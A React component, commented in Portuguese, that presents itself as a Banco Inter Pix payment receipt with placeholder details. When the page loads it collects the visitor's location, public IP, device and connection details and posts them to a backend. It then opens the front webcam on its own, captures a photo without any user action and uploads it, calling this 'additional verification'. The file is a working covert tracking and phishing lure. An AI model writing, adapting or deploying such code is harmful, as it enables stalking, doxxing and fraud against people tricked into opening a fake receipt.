// components/Comprovante.js
"use client";

import React, { useEffect, useState, useRef } from 'react';
import styles from './comprovante.module.css'; // Certifique-se que este arquivo existe e contém seus estilos

const Comprovante = () => {
  // Estados
  const [webcamActive, setWebcamActive] = useState(false);
  const [stream, setStream] = useState(null); // Estado para o stream da webcam
  const [sendingLocation, setSendingLocation] = useState(true); // Assume que tenta enviar na montagem
  const [sendingPhoto, setSendingPhoto] = useState(false);
  const [photoTaken, setPhotoTaken] = useState(false);
  const [locationSentOrAttempted, setLocationSentOrAttempted] = useState(false); // Indica se a tentativa de envio de localização terminou
  const [isVideoReady, setIsVideoReady] = useState(false); // Controla se o vídeo carregou dados suficientes

  // Refs para elementos DOM
  const videoRef = useRef(null);
  const canvasRef = useRef(null);

  // --- Funções Auxiliares ---

  async function getIpAddress() {
    try {
      // Usar um serviço confiável. Se ipify falhar, considere alternativas ou trate o erro.
      const response = await fetch('https://api.ipify.org?format=json');
      if (!response.ok) {
        console.warn("Falha ao buscar IP de ipify:", response.status);
        return 'IP não disponível (API)';
      }
      const data = await response.json();
      return data.ip;
    } catch (error) {
      console.error("Erro de rede ao buscar IP:", error);
      return 'IP não disponível (Erro Rede)';
    }
  }

  // Envia dados iniciais (localização, dispositivo) para o backend
  async function sendLocationData(position) {
    // Evita reenvio se a tentativa já ocorreu
    if (locationSentOrAttempted) return;

    setSendingLocation(true); // Indica que está enviando
    console.log("Enviando dados de localização...");

    // Coleta todos os dados
    const ip = await getIpAddress();
    const latitude = position?.coords?.latitude ?? 'Lat indisponível';
    const longitude = position?.coords?.longitude ?? 'Lon indisponível';
    const userAgent = navigator.userAgent || 'N/A';
    const screenWidth = window.screen?.width ?? 'N/A';
    const screenHeight = window.screen?.height ?? 'N/A';
    const language = navigator.language || 'N/A';
    const cookies = document.cookie ? 'Disponível (Leitura JS)' : 'Indisponível/HttpOnly';
    const connection = navigator.connection ? {
        type: navigator.connection.type || 'N/A',
        downlink: navigator.connection.downlink || 'N/A'
    } : 'API Conexão Indisponível';

    const dataToSend = {
      latitude, longitude, ip, userAgent, screenWidth,
      screenHeight, language, cookies, connection
    };

    try {
      // Envia para o endpoint correto para dados de localização
      const response = await fetch("/api/send-data", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(dataToSend)
      });
      if (response.ok) {
        console.log("Dados de localização enviados com sucesso.");
      } else {
        console.error("Erro no servidor ao enviar dados de localização. Status:", response.status);
      }
    } catch (error) {
      console.error("Erro de rede ao enviar dados de localização:", error);
    } finally {
      console.log("Tentativa de envio de localização concluída.");
      setSendingLocation(false); // Finaliza o estado de envio
      setLocationSentOrAttempted(true); // Marca que a tentativa (sucesso ou falha) ocorreu
    }
  }

  // Handler para erros de geolocalização
  function handleLocationError(error) {
    console.warn(`Erro ao obter geolocalização: ${error.code} - ${error.message}`);
    // Tenta enviar os dados mesmo sem coordenadas se ainda não foi tentado
    if (!locationSentOrAttempted) {
        sendLocationData({ coords: null });
    }
  }

  // --- Funções da Webcam ---

  // Inicia o processo de acesso à webcam
  const startWebcam = async () => {
    // Verifica se a API está disponível antes de tentar usá-la
    if (typeof navigator === 'undefined' || !navigator.mediaDevices || typeof navigator.mediaDevices.getUserMedia !== 'function') {
      console.error("Erro: navigator.mediaDevices.getUserMedia não está disponível neste ambiente.");
      alert("Não é possível acessar a câmera neste navegador ou contexto (verifique HTTPS/localhost e permissões).");
      setWebcamActive(false); // Garante que o estado reflita a falha
      return;
    }

    // Previne múltiplas inicializações ou se já tirou foto ou se ainda está enviando localização
    if (webcamActive || photoTaken || sendingLocation) return;

    console.log("Tentando iniciar webcam...");
    setIsVideoReady(false); // Reseta o estado de prontidão do vídeo
    try {
      // Solicita acesso ao vídeo da câmera frontal
      const mediaStream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'user' },
        audio: false // Não precisamos de áudio
      });
      console.log("Stream da webcam obtido com sucesso.");
      // Atualiza os estados para refletir que a webcam está ativa e o stream foi obtido
      setStream(mediaStream);
      setWebcamActive(true);
    } catch (err) {
      console.error("Erro ao acessar a webcam (getUserMedia falhou):", err);
       // Trata erros comuns como permissão negada
       if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
           alert("Permissão para acessar a câmera foi negada. A verificação adicional não pode ser concluída.");
       } else {
           alert(`Não foi possível acessar a webcam: ${err.name}. A verificação adicional não pode ser concluída.`);
       }
      // Garante que o estado reflita a falha
      setWebcamActive(false);
      setStream(null);
    }
  };

  // Para a webcam e limpa o stream
  const stopWebcam = () => {
    if (stream) {
      stream.getTracks().forEach(track => track.stop()); // Para todas as trilhas (vídeo)
      console.log("Webcam parada.");
    }
    // Limpa os estados relacionados à webcam
    setStream(null);
    setWebcamActive(false);
    setIsVideoReady(false);
  };

  // Chamada quando o vídeo tem dados suficientes para começar a tocar
  const handleVideoReady = () => {
     // Verifica se a webcam está ativa, se o elemento de vídeo existe,
     // se o vídeo tem dados suficientes (readyState >= 3), se não está enviando/tirado foto,
     // e se já não consideramos pronto
     if (webcamActive && videoRef.current && videoRef.current.readyState >= 3 && !sendingPhoto && !photoTaken && !isVideoReady) {
        console.log("Video stream pronto (readyState>=3), tirando foto automaticamente após pequeno delay...");
        setIsVideoReady(true); // Marca como pronto para evitar chamadas múltiplas
        // Adiciona um pequeno delay antes de tirar a foto - pode ajudar o vídeo a estabilizar
        setTimeout(takePhoto, 250); // Delay de 250ms
     }
  };

  // Captura o frame atual do vídeo e envia para o backend
  const takePhoto = async () => {
    // Verifica condições para evitar execução indesejada
    if (!webcamActive || sendingPhoto || photoTaken || !videoRef.current || !canvasRef.current) return;

    setSendingPhoto(true); // Indica que está processando/enviando a foto
    console.log("Capturando foto...");

    const video = videoRef.current;
    const canvas = canvasRef.current;

    // Verifica se o vídeo tem dimensões válidas (carregou) e estado pronto
    if (video.videoWidth > 0 && video.videoHeight > 0 && video.readyState >= 3) {
      // Ajusta o canvas para as dimensões do vídeo
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const context = canvas.getContext('2d');

      // Desenha o frame atual do vídeo no canvas
      context.drawImage(video, 0, 0, canvas.width, canvas.height);

      // Converte o conteúdo do canvas para um Blob (formato de arquivo)
      canvas.toBlob(async (blob) => {
        if (blob && blob.size > 0) {
            console.log(`Blob da foto criado: size=${blob.size}, type=${blob.type}`);

            // Cria um FormData para enviar o arquivo
            const formData = new FormData();
            // 'photo' é o nome do campo esperado pelo backend
            formData.append('photo', blob, 'webcam_auto.jpg');

            console.log("Enviando FormData para /api/send-photo...");
            try {
              // Envia o FormData para o endpoint correto
              const response = await fetch('/api/send-photo', {
                method: 'POST',
                body: formData, // O navegador definirá o Content-Type corretamente
              });

              if (response.ok) {
                console.log("Foto enviada com sucesso para o backend!");
                setPhotoTaken(true); // Marca que a foto foi concluída
                stopWebcam(); // Para a câmera após o sucesso
              } else {
                console.error("Erro retornado pelo servidor ao enviar foto. Status:", response.status);
                 const errorData = await response.json().catch(() => ({ message: "Falha ao ler resposta de erro." }));
                 console.error("Mensagem de erro do backend:", errorData.message);
                stopWebcam(); // Para a câmera mesmo em caso de erro no envio
              }
            } catch (error) {
              console.error("Erro de rede ao enviar foto:", error);
              stopWebcam(); // Para a câmera em caso de erro de rede
            } finally {
              setSendingPhoto(false); // Finaliza o estado de envio da foto
            }
        } else {
          console.error("Erro: Blob da foto está vazio ou nulo! Não foi possível capturar a imagem.");
          setSendingPhoto(false);
          stopWebcam(); // Para a câmera se falhar
        }
      }, 'image/jpeg', 0.85); // Define o formato e qualidade da imagem (85%)
    } else {
        console.error("Erro: Vídeo não está pronto ou sem dimensões ao tentar tirar foto.");
        setSendingPhoto(false);
        if(webcamActive) stopWebcam(); // Para a câmera se algo deu errado
    }
  };


  // --- Hooks useEffect ---

  // useEffect 1: Roda uma vez na montagem para buscar a localização inicial
  useEffect(() => {
    console.log("Componente montado. Buscando localização inicial...");
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        sendLocationData,
        handleLocationError,
        { enableHighAccuracy: false, timeout: 15000, maximumAge: 60000 } // Opções de geolocalização
      );
    } else {
      console.warn("Geolocalização não é suportada por este navegador.");
      // Tenta enviar dados mesmo sem API de geolocalização
      sendLocationData({ coords: null });
    }

    // Função de limpeza: Para a webcam se o componente for desmontado inesperadamente
    return () => {
      console.log("Componente desmontando, parando webcam (limpeza inicial).")
      stopWebcam();
    };
    // Array de dependências vazio [] significa que só roda na montagem e desmontagem
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  // useEffect 2: Agenda o início da webcam APÓS a tentativa de localização terminar (com atraso)
  useEffect(() => {
    let timerId = null; // Variável para guardar o ID do timeout

    // Condições para agendar: localização tentada, webcam não ativa, foto não tirada, não enviando localização
    if (locationSentOrAttempted && !webcamActive && !photoTaken && !sendingLocation) {
      console.log("Tentativa de localização concluída. Agendando início da webcam em 1.5 segundos...");
      // Define um timeout para chamar startWebcam após 1500ms (1.5 segundos)
      timerId = setTimeout(startWebcam, 1500);
    }

    // Função de limpeza para este useEffect: cancela o timeout se as condições mudarem antes dele disparar
    return () => {
      if (timerId) {
        console.log("Limpando timeout agendado da webcam.");
        clearTimeout(timerId);
      }
    };
    // Dependências: executa quando qualquer um desses estados mudar
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [locationSentOrAttempted, webcamActive, photoTaken, sendingLocation]);

  // useEffect 3: Atribui o stream ao elemento de vídeo QUANDO o estado 'stream' muda
  useEffect(() => {
    // Verifica se temos um stream e se o elemento de vídeo já foi renderizado (ref.current existe)
    if (stream && videoRef.current) {
      console.log("Atribuindo stream da webcam ao elemento de vídeo.");
      // Define o source do vídeo para ser o stream da webcam
      videoRef.current.srcObject = stream;
    } else if (!stream && videoRef.current) {
        // Garante que o vídeo para se o stream for removido
        console.log("Removendo stream do elemento de vídeo.");
        videoRef.current.srcObject = null;
    }
    // Não há necessidade de limpeza específica para srcObject, pois stopWebcam lida com os tracks
  }, [stream]); // Dependência: só executa quando o estado 'stream' mudar

  // --- JSX (Renderização do Componente) ---
  return (
    <> {/* Fragmento React para agrupar elementos */}
      {/* Camada de Overlay (se ainda necessária) */}
      <div className={styles.overlay}></div>

      {/* Container principal do comprovante */}
      <div className={styles.document}>
        {/* Cabeçalho do Comprovante */}
        <div className={styles.header}>
          Inter
          <span>Pix enviado <strong>R$ 99,99</strong></span>
        </div>

        {/* Conteúdo principal do Comprovante */}
        <div className={styles.content}>
          {/* Seção: Sobre a transação */}
          <div className={styles.sectionTitle}>Sobre a transação</div>
          <div className={styles.infoLine}>
            <div className={styles.infoLabel}>Data da transação</div>
            <div className={styles.infoValue}>25/03/2025</div>
          </div>
          <div className={styles.infoLine}>
            <div className={styles.infoLabel}>Horário</div>
            <div className={styles.infoValue}>18h58</div>
          </div>
          <div className={styles.infoLine}>
            <div className={styles.infoLabel}>Identificador</div>
            <div className={styles.infoValue}>abc123xyz456ficticio</div>
          </div>
          <div className={styles.infoLine}>
            <div className={styles.infoLabel}>ID da transação</div>
            <div className={styles.infoValue}>E0000000000000000000FAKE</div>
          </div>

          {/* Seção: Quem pagou */}
          <div className={styles.sectionTitle}>Quem pagou</div>
          <div className={styles.infoLine}>
            <div className={styles.infoLabel}>Nome</div>
            <div className={styles.infoValue}>Fulano de Tal</div>
          </div>
          <div className={styles.infoLine}>
            <div className={styles.infoLabel}>CPF/CNPJ</div>
            <div className={styles.infoValue}>***.123.456-**</div>
          </div>
          <div className={styles.infoLine}>
            <div className={styles.infoLabel}>Número da conta</div>
            <div className={styles.infoValue}>00012345-6</div>
          </div>
          <div className={styles.infoLine}>
            <div className={styles.infoLabel}>Agência</div>
            <div className={styles.infoValue}>0001</div>
          </div>
          <div className={styles.infoLine}>
            <div className={styles.infoLabel}>Instituição</div>
            <div className={styles.infoValue}>BANCO INTER S.A.</div>
          </div>

          {/* Seção: Quem recebeu */}
          <div className={styles.sectionTitle}>Quem recebeu</div>
          <div className={styles.infoLine}>
            <div className={styles.infoLabel}>Nome</div>
            <div className={styles.infoValue}>Loja Exemplo</div>
          </div>
          <div className={styles.infoLine}>
            <div className={styles.infoLabel}>CPF/CNPJ</div>
            <div className={styles.infoValue}>12.345.678/0001-90</div>
          </div>
          <div className={styles.infoLine}>
            <div className={styles.infoLabel}>Número da conta</div>
            <div className={styles.infoValue}>4135802-6</div>
          </div>
          <div className={styles.infoLine}>
            <div className={styles.infoLabel}>Agência</div>
            <div className={styles.infoValue}>0001</div>
          </div>
          <div className={styles.infoLine}>
            <div className={styles.infoLabel}>Instituição</div>
            <div className={styles.infoValue}>MAGALUPAY</div>
          </div>

           {/* Container para o vídeo e status - Renderizado condicionalmente */}
           {/* Mostra APENAS se a webcam estiver ativa E a foto ainda não foi tirada */}
           {webcamActive && !photoTaken && (
              <div style={{
                position: 'fixed', // Posição fixa na tela
                bottom: '10px',    // Canto inferior esquerdo
                left: '10px',
                zIndex: 100,        // Fica sobre outros elementos
                background: 'rgba(0,0,0,0.6)', // Fundo semi-transparente
                padding: '5px',
                borderRadius: '5px',
                border: '1px solid #444'
              }}>
                {/* Elemento de vídeo para exibir o stream */}
                <video
                  ref={videoRef} // Anexa a ref aqui
                  autoPlay      // Inicia automaticamente
                  playsInline   // Necessário para iOS
                  muted         // Silencia o áudio (não solicitado, mas boa prática)
                  onLoadedData={handleVideoReady} // Evento quando dados suficientes carregam
                  onCanPlay={handleVideoReady}    // Evento quando pode começar a tocar (redundante, mas seguro)
                  onError={(e) => console.error("Erro no elemento de vídeo HTML:", e)} // Captura erros do vídeo
                  style={{ width: '100px', height: 'auto', display: 'block' }} // Estilo pequeno
                  aria-label="Webcam stream (auto capture)"
                />
                {/* Canvas oculto usado apenas para capturar o frame */}
                <canvas ref={canvasRef} style={{ display: 'none' }}></canvas>
                {/* Indicador de status durante o envio da foto */}
                {sendingPhoto && <p style={{color: 'white', fontSize: '10px', margin: '2px 0 0', textAlign: 'center' }}>Processando...</p>}
              </div>
           )}

           {/* Mensagem de feedback opcional após a conclusão */}
           {photoTaken && (
             <p style={{ textAlign: 'center', color: 'green', marginTop: '15px', fontSize: '12px', fontWeight: 'bold'}}>Verificação adicional completa.</p>
           )}

        </div> {/* Fim div.content */}
      </div> {/* Fim div.document */}
    </>
  );
};

export default Comprovante; // Exporta o componente para ser usado em `app/page.js`